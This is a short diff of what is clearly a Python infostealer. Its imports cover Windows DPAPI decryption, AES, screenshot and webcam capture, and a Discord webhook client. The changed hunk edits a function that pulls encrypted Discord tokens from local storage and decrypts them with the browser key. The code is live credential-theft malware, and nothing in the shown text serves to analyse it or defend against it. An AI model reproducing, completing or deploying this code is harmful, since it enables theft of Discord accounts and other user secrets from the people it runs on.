@@ -1,22 +1,20 @@
 import base64
-import json
-import os
-import re
 import shutil
 import glob
 import subprocess
-from typing import Any
-
 import cv2
 import win32com.client
-import requests
+import os
+import re
+from json import loads
+
+import win32crypt
 
 from PIL import Image
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from mss import mss
 from Cryptodome.Cipher import AES
 from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 
 user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
@@ -148,7 +146,7 @@ def getDcToken():
                 elif i not in cleaned:
                     cleaned.append(i)
             for token in cleaned:
-                done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
+                done += [decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])]
 
         else:  # old method without encryption
             for file_name in os.listdir(path):
